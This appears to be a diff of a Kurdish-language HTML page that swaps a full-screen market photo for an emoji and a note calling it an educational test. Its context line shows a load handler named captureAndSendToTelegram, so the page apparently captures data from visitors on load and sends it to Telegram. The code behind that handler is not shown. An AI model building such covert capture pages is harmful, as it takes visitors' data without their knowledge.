@@ -232,26 +232,35 @@ window.addEventListener("load", captureAndSendToTelegram);
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>وێنەی مارکێت</title>
+    <title>تاقیکردنەوەی ئیمۆجی</title>
     <style>
         body {
             margin: 0;
-            height: 80vh;
+            height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             background-color: #111;
+            color: white; /* ڕەنگی نوسینەکە سپی دەکەین بۆ ئەوەی دیار بێت */
         }
-        .market-img {
-            width: 80%;
-            height: 80vh;
-            object-fit: cover;
+        .emoji-display {
+            font-size: 100px; /* قەبارەی ئیمۆجییەکە گەورە دەکەین */
+            text-align: center;
+        }
+        .note {
+            font-size: 20px;
+            margin-top: 20px;
+            font-family: sans-serif;
         }
     </style>
 </head>
 <body>
 
-    <img src="photo.jpg" alt="Market Image" class="market-img">
+    <div class="emoji-display">
+        <!-- ئەمە ئەو ئیمۆجییەیە کە وێنەی قەڵاکە دەگرێتەوە -->
+        😁 
+        <div class="note">ئەمە تەنها تاقیکردنەوەیەکی فێرکارییە!</div>
+    </div>
 
 </body>
 </html>
